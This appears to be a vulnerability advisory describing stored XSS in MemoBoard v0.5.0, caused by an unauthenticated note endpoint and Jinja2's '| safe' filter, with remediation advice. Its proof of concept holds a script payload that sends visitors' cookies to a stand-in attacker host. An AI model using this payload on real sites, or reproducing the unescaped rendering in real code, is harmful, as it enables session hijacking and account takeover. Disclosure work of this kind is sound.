# Advisory: MemoBoard stored XSS via unescaped note body (| safe filter)

## Summary

MemoBoard v0.5.0 is affected by a stored cross-site scripting (XSS) vulnerability. The note creation endpoint `POST /api/notes` requires no authentication, and the note `body` field is rendered on the public `/notes` page using Jinja2's `| safe` filter, which disables HTML auto-escaping. An anonymous attacker can inject arbitrary JavaScript that executes in every visitor's browser, enabling session cookie theft and account impersonation.

## Description

The `POST /api/notes` endpoint in `app.py` (lines 87–94) accepts a JSON body with `title`, `body`, and `author` fields without any authentication check:

```python
@app.post("/api/notes")
def api_create_note():
    payload = request.get_json(silent=True) or {}
    title = str(payload.get("title") or request.form.get("title") or "untitled")
    body = str(payload.get("body") or request.form.get("body") or "")
    author = str(payload.get("author") or request.form.get("author") or "anonymous")
    note_id = create_note(author=author, title=title, body=body)
    return jsonify({"id": note_id, "ok": True}), 201
```

The `body` value is stored verbatim in the SQLite database via `create_note` (parameterized query, no sanitization).

The public page `GET /notes` (lines 37–39) renders all notes using the `notes.html` template. On line 18, the body is rendered with the `| safe` filter:

```html
<div class="body">{{ n.body | safe }}</div>
```

The `| safe` filter marks the content as trusted, causing Jinja2 to skip its default HTML auto-escaping. As a result, any HTML or JavaScript in the `body` field is output raw into the page HTML. When another user (including an administrator) visits `/notes`, the injected script executes in their browser context.

Since `POST /api/notes` has no authentication and `GET /notes` is a public page visible to all users, an anonymous attacker can plant persistent JavaScript payloads that execute for every visitor, including the admin.

## Affected versions

- MemoBoard v0.5.0 (all versions shipped with the current codebase)

## Impact

An unauthenticated attacker can inject persistent JavaScript into the public notes page. When any other user — including the administrator — visits `/notes`, the script executes in their browser. This enables:

- **Session cookie theft**: Steal the Flask session cookie of any visitor, including admin, enabling session hijacking.
- **Account impersonation**: Perform actions as the victim (create notes, access admin-only endpoints).
- **Privilege escalation chain**: Stolen admin session cookies can be used to access the admin-only `/api/tools/ping` endpoint, which is vulnerable to command injection (RCE).

## Proof of concept

```bash
# 1. Create a note with XSS payload (no authentication required)
curl -X POST http://TARGET:5000/api/notes \
  -H "Content-Type: application/json" \
  -d '{"title":"test","body":"<script>fetch(\"https://attacker.com/steal?c=\"+document.cookie)</script>","author":"anonymous"}'

# Response: {"id":3,"ok":true}

# 2. Fetch the public notes page
curl http://TARGET:5000/notes

# The HTML contains the raw, unescaped <script> tag:
# <div class="body"><script>fetch("https://attacker.com/steal?c="+document.cookie)</script></div>
# When any user visits /notes in a browser, the script executes.
```

## Remediation

Remove the `| safe` filter from the template so Jinja2's default auto-escaping applies:

```html
<div class="body">{{ n.body }}</div>
```

If rich HTML is required, use a sanitization library such as `bleach` with a strict tag/attribute whitelist before storing or rendering the body. Additionally, add authentication to `POST /api/notes` to prevent anonymous note creation.

## References

- CWE-79: Improper Neutralization of Input Used During Page Generation ("Cross-site Scripting")
- Jinja2 documentation: [autoescaping](https://jinja.palletsprojects.com/en/3.1.x/templates/#autoescaping)
